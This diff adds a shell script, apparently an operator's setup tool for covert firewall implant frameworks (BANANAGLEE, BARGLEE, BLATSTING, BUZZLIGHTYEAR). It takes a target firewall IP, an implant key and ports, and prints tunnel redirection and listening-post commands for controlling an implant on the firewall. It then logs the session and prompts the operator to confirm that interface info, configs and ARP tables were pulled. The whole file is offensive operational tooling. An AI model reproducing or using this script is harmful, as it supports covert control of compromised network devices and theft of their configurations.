@@ -1,0 +1,372 @@
+#!/bin/sh
+#
+# BG User script:
+# Script to set up user env for BG
+#
+# Changelog:
+# 6/23/10 -- Cleaned up script, as well as fixed error with multiple scripts being started
+# 7/9/10 -- Changed the format of the log file created
+# 7/8/11 -- Changed to support both Blatsting, BG and Bliar
+# 11/9/12 -- Changed to support for BUZZLIGHTYEAR
+# 3/11/13 -- Added BANALRIDE.
+# 5/3/13 -- Changed BANALRIDE ASA location to BG3121.
+# 6/11/13 -- Modified layout of disk so TPATHS have been updated...
+
+loop1=0;
+dummy=0;
+source=`mkrandom -n 1025 65535`
+dest=`mkrandom -n 1025 65535`
+
+
+echo ""
+echo ""
+echo ""
+echo "----------------------------------------------------------------------------------------"
+echo "|                                                                                      |"
+echo "|       WELCOME TO BANANAGLEE / BARGLEE / BLATSTING / BUZZLIGHTYEAR / BANALMONKEY      |"
+echo "|                                                                                      |"
+echo "----------------------------------------------------------------------------------------"
+echo ""
+echo ""
+
+
+while [ "$loop1" = "0" ]; do
+	echo "BG2100"
+	echo "BG2200"
+	echo "BG3000"
+	echo "BG3100"
+        echo "BARGLEE3100"
+        echo "BM1120"
+	echo "BLATSTING"	
+	echo "BUZZ_1120"
+	echo "BUZZ_1200"
+	echo ""
+	echo ""
+	echo -n "What version of Tool are you going to use: "
+	read _BGVER
+        let loop1=$loop1+1
+#	echo "BGVER is :$_BGVER"
+                if [ "$_BGVER" = "" ]; then
+                        let loop1=$loop1-1
+		elif [ "$_BGVER" = "BG2100" ]; then
+                        echo -n "Is this a NETSCREEN firewall (y,[n])? "
+                        read _answer2
+                        if [ "$_answer2" = "" ]; then
+                                   _answer2=n
+                        fi
+                        echo ""
+                        case $_answer2 in
+                                        y*|Y*)
+                                               USE_BLIAR="YES";;
+                                        *) echo -n "Are you sure? Don't forget that NETSCREEN firewalls require BANANALIAR!!" 
+					   echo "" 
+					   echo "" ;;
+
+                                esac
+			TPATH="BANANAGLEE/$_BGVER/Install"
+			ISBG="yes"
+		elif [ "$_BGVER" = "BG2200" ]; then
+			TPATH="BANANAGLEE/$_BGVER/Install"	
+			ISBG="yes"
+		elif [ "$_BGVER" = "BG3000" ]; then
+			TPATH="BANANAGLEE/$_BGVER/Install"
+			ISBG="yes"
+		elif [ "$_BGVER" = "BG3100" ]; then
+			TPATH="BANANAGLEE/$_BGVER/Install"
+			ISBG="yes"
+		elif [ "$_BGVER" = "BARGLEE3100" ]; then
+                        TPATH="BARGLEE/$_BGVER/Install"
+                        USE_BARLIAR="YES"
+                        ISBG="yes"
+                elif [ "$_BGVER" = "BM1120" ]; then
+                        echo -n "Is this an ASA firewall (y,[n])? "
+                        read _answer2
+                        if [ "$_answer2" = "" ]; then
+                                   _answer2=n
+                        fi
+                        echo ""
+                        case $_answer2 in
+                                        y*|Y*)
+                                               TPATH="BANANAGLEE/BG3121/Install";;
+					*)
+                                               TPATH="BANANAGLEE/BG2200/Install";;
+                                esac
+                        USE_BRIDE="YES"
+			ISBG="yes"
+                        NOKEY="yes"
+		elif [ "$_BGVER" = "BUZZ_1120" ]; then	
+			TPATH="BUZZDIRECTION/$_BGVER"
+			USE_BUZZ="YES"
+			ISBUZZ="yes"
+			ISBG="no"
+		elif [ "$_BGVER" = "BUZZ_1200" ]; then	
+			TPATH="BUZZDIRECTION/$_BGVER"
+			USE_BUZZ="YES"
+			ISBUZZ="yes"
+			ISBG="no"
+		else 	echo ""	
+			ls -1rt /current/bin/FW/BLATSTING | grep BLATSTING
+			echo ""
+			echo ""
+			echo -n "What version of BLATSTING are you going to use: "
+					read _BSVER
+		                if [ "$_BSVER" = "" ]; then
+					let loop1=$loop1-2
+				fi
+					TPATH="BLATSTING/$_BSVER"
+		fi
+#	echo "BPATH  is :$TPATH"		
+	echo -n "Enter Project Name(required): "		#MANDO FIELD
+	read _P1
+	let loop1=$loop1+1
+		if [ "$_P1" = "" ]; then
+			let loop1=$loop1-1
+		fi
+	echo ""
+	echo "          A BLOCKME rule will be set for this IP !!!"
+	echo ""
+	echo -n "Enter actual firewall IP Address(required): "		#MANDO FIELD
+	read _I1
+	let loop1=$loop1+1
+	blockme $_I1 > /dev/null
+		if [ "$_I1" = "" ]; then
+			let loop1=$loop1-1
+		fi
+
+	echo -n "	Would you like to use a different IP to communicate to BG with (y,[n])? "
+	read _diffIPa
+	case $_diffIPa in
+		y*|Y*)  echo ""
+			echo "          A BLOCKME rule will be set for this IP !!!"
+			echo ""
+			echo "          Do NOT use a local IP or one in your path, it will effect comms."
+			echo ""
+			echo -n "What IP would you like to use: "
+			read _diffIP
+			blockme $_diffIP > /dev/null
+			dummy=1;;
+		*) ;;
+	esac
+	echo -n "Enter Host Name(required): "		#MANDO FIELD
+	read _H1
+	let loop1=$loop1+1
+		if [ "$_H1" = "" ]; then
+			let loop1=$loop1-1
+		fi
+
+	echo -n "Enter LP IP Address(127.0.0.1): "           #MANDO FIELD
+	read _LP1
+	let loop1=$loop1+1
+       		if [ "$_LP1" = "" ]; then
+	               	_LP1=127\.0\.0\.1
+       		fi
+
+	echo -n "Enter Implant IP Address(127.0.0.1): "           #MANDO FIELD
+	read _Implant1
+	let loop1=$loop1+1
+       		if [ "$_Implant1" = "" ]; then
+	                _Implant1=127\.0\.0\.1
+       		fi
+			if [ "$_Implant1" != "127.0.0.1" ]; then
+				echo -n "Are you sure you do not want to use 127.0.0.1 (y,n)?"
+				read _answer
+				if [ "$_answer" = "" ]; then
+					answer=n
+				fi
+				case $_answer in
+				        n*|N*) echo "Ok...chaning to 127.0.0.1"
+						_Implant1=127\.0\.0\.1;;
+					*) echo "Ok..hope you know what you are doing...do not direct connect to target.";;
+				esac
+			fi
+					
+        if [ "$NOKEY" = "" ]; then
+	 	echo -n "Enter Name of Key(required): "           #MANDO FIELD
+		read _Key1
+		let loop1=$loop1+1
+		        if [ "$_Key1" = "" ]; then
+       	        	       let loop1=$loop1-1
+       			fi
+	else
+		_Key1="NO KEY REQUIRED"
+                let loop1=$loop1+1
+	fi
+	echo -n "Enter Source Port(RHP) to use($source): "           #MANDO FIELD
+	read _Source1
+	let loop1=$loop1+1
+       		if [ "$_Source1" = "" ]; then
+			let _Source1=$source
+       		fi
+
+	echo -n "Enter Dest Port(RHP) to use($dest): "           #MANDO FIELD
+	read _Dest1
+	let loop1=$loop1+1
+       		if [ "$_Dest1" = "" ]; then
+               		let _Dest1=$dest
+       		fi
+
+	if [ $loop1 != 9 ]; then
+		echo ""
+		echo ""
+		echo "Oh no!! You screwed something up."
+		echo ""
+		echo "Please try again."
+		echo ""
+		echo ""
+		let loop1=0
+	fi
+done
+
+		if [ "$_BGVER" = "BLATSTING" ]; then
+
+			xxdkey1=` xxd -l 4 $_Key1  | cut -d: -f2| cut -d ' ' -f 2`
+			xxdkey2=` xxd -l 4 $_Key1  | cut -d: -f2| cut -d ' ' -f 3`
+			xxdkey="$xxdkey1$xxdkey2"
+			echo "Your implant ID is $xxdkey"
+						
+			#ls -lart $xxdkey
+		fi
+
+_TIME=`date +%Y%m%d%k%M`	#timestamp if we ever need it
+
+cd /current/bin/FW/$TPATH/LP
+#ls -lart $xxdkey
+
+echo ""
+echo -n "CWD has been set to: "; pwd
+echo ""
+touch /current/down/FW_SETUP.info.$_I1
+echo "This is the information used/pulled from BG" > /current/down/FW_SETUP.info.$_I1
+#
+# Testing for presence of dupe file...renaming if required.
+# savelog is really nice, but not on every system, so we use stupid
+# mv instead and append the PID to it!
+# We'll touch the script here too and then run a few commands 
+# "Script" will append to this file later on...
+
+# Now we start putting stuff in it...
+#
+
+echo "" | tee -a /current/down/FW_SETUP.info.$_I1
+echo "DateTime: $_TIME" | tee -a /current/down/FW_SETUP.info.$_I1		#uncomment this to incl timestamp in log
+echo "" | tee -a /current/down/FW_SETUP.info.$_I1
+echo "#project: $_P1" | tee -a /current/down/FW_SETUP.info.$_I1
+echo "#ip: $_I1" | tee -a /current/down/FW_SETUP.info.$_I1
+echo "#hostname: $_H1" | tee -a /current/down/FW_SETUP.info.$_I1
+echo "#LP IP: $_LP1" | tee -a /current/down/FW_SETUP.info.$_I1
+echo "#Implant IP: $_Implant1" | tee -a /current/down/FW_SETUP.info.$_I1
+echo "#Key: $_Key1" | tee -a /current/down/FW_SETUP.info.$_I1
+echo "#Source Port: $_Source1" | tee -a /current/down/FW_SETUP.info.$_I1
+echo "#Dest Port: $_Dest1" | tee -a /current/down/FW_SETUP.info.$_I1
+echo "" | tee -a /current/down/FW_SETUP.info.$_I1
+
+
+
+
+# Now we are going to make your log directory
+
+# Once that craziness is finished, we can start the script up. Contents will append
+# to the existing "touched" file. We had to do this since script actually forks off
+# into it's own little world and will not allow other commands to be run until
+# the script is stopped.
+#
+
+echo "Your redirection line is as follows:"
+echo "------------------------------------"
+echo "Unix:"
+echo "-tunnel"
+case $dummy in
+	0) 	echo "u $_Dest1 $_I1 $_Dest1 $_Source1";;
+	1)	echo "u $_Dest1 $_diffIP $_Dest1 $_Source1";;
+	*)	echo "Something screwed up, you SHOULD now your tunnel";;
+esac
+echo ""
+echo ""
+echo ""
+echo "Here is your LP line to paste."
+
+if [ "$USE_BLIAR" = "YES" ]; then
+	echo "./BLIAR-2110 --lp $_LP1 --implant $_Implant1 --idkey /current/bin/FW/OPS/$_Key1 --sport $_Source1 --dport $_Dest1"
+elif [ "$USE_BARLIAR" = "YES" ]; then
+       echo "./BARLIAR-3100 --lp $_LP1 --implant $_Implant1 --idkey /current/bin/FW/OPS/$_Key1 --sport $_Source1 --dport $_Dest1"
+elif [ "$USE_BUZZ" = "YES" ]; then
+	echo "./run-lp_python.sh --lp $_LP1 --implant $_Implant1 --key /current/bin/FW/OPS/$_Key1 --sport $_Source1 --dport $_Dest1"
+elif [ "$USE_BRIDE" = "YES" ]; then
+	echo "./bride-1120 --lp $_LP1 --implant $_Implant1 --sport $_Source1 --dport $_Dest1"
+else
+	echo "./lp --lp $_LP1 --implant $_Implant1 --idkey /current/bin/FW/OPS/$_Key1 --sport $_Source1 --dport $_Dest1"
+fi
+echo ""
+echo ""
+echo ""
+
+/usr/bin/script -af /current/down/script."$_I1".firewall.log
+
+echo "" | tee -a /current/down/script."$_I1".firewall.log
+echo "DateTime: $_TIME" | tee -a /current/down/script."$_I1".firewall.log
+echo "" | tee -a /current/down/script."$_I1".firewall.log
+echo "#project: $_P1" | tee -a /current/down/script."$_I1".firewall.log
+echo "#ip: $_I1" | tee -a /current/down/script."$_I1".firewall.log
+echo "#hostname: $_H1" | tee -a /current/down/script."$_I1".firewall.log
+echo "" | tee -a /current/down/script."$_I1".firewall.log
+echo "" | tee -a /current/down/script."$_I1".firewall.log
+
+
+
+
+
+echo "Use CTRL D to stop the script"
+echo ""
+#
+# Now we ask Bunch O' Questions...
+#
+echo ""
+echo "Now the interrogation begins..."
+echo ""
+echo -n "Could you to talk to the Implant? (y or [n]): "
+read _TALK
+	
+echo -n "Did you pull Interface info? (y or [n])? "
+read _INT
+
+echo -n "Did you pull a config? (y or [n])? "
+read _CONFIG
+
+echo -n "Did you pull an arp? (y or [n])? "
+read _ARP
+
+echo -n "Is there any comments you would like to add, i.e. did something special or encountered errors? (Just leave blank if everything is as normal)"
+read _COMMENTS
+
+# Now we add all the answers above to the end of the script file...
+
+echo "" | tee -a /current/down/FW_SETUP.info.$_I1 | tee -a /current/down/script."$_I1".firewall.log
+echo "#Talk to BG:$_TALK" | tee -a /current/down/FW_SETUP.info.$_I1 | tee -a /current/down/script."$_I1".firewall.log
+echo "#Pull Interface Info:$_INT" | tee -a /current/down/FW_SETUP.info.$_I1 | tee -a /current/down/script."$_I1".firewall.log
+echo "#Pulled Config:$_CONFIG" | tee -a /current/down/FW_SETUP.info.$_I1 | tee -a /current/down/script."$_I1".firewall.log
+echo "#Pull an ARP:$_ARP" | tee -a /current/down/FW_SETUP.info.$_I1 | tee -a /current/down/script."$_I1".firewall.log
+echo "#User comments:$_COMMENTS" | tee -a /current/down/FW_SETUP.info.$_I1 | tee -a /current/down/script."$_I1".firewall.log
+
+
+
+
+# One last chance to rename the file before we finish...
+#
+echo ""
+echo "We are now going to move your log directory, please check to ensure it makes it there"
+	if [ "$ISBG" = "yes" ]; then
+		mkdir /current/down/$_H1\.$_I1
+		mv /current/bin/FW/$TPATH/LP/$_Implant1/* /current/down/$_H1.$_I1/
+		mv /current/down/FW_SETUP.info.$_I1 /current/down/$_H1.$_I1/
+	elif [ "$ISBUZZ" = "yes" ];then
+		mkdir /current/down/$_H1\.$_I1 /current/down/$_H1\.$_I1\_logs
+		mv /current/bin/FW/$TPATH/LP/Output/* /current/down/$_H1.$_I1/
+		mv /current/bin/FW/$TPATH/LP/Logs/* /current/down/$_H1.$_I1\_logs/
+		mv /current/down/FW_SETUP.info.$_I1 /current/down/$_H1.$_I1/
+	else	mkdir /current/down/FW-data.$_H1\.$_I1
+		mv /current/bin/FW/$TPATH/LP/$xxdkey/* /current/down/FW-data.$_H1.$_I1/
+		mv /current/down/FW_SETUP.info.$_I1 /current/down/FW-data.$_H1.$_I1/
+	fi
+# This next command will whack whatever we spawned from this
+kill 0
+#EOF
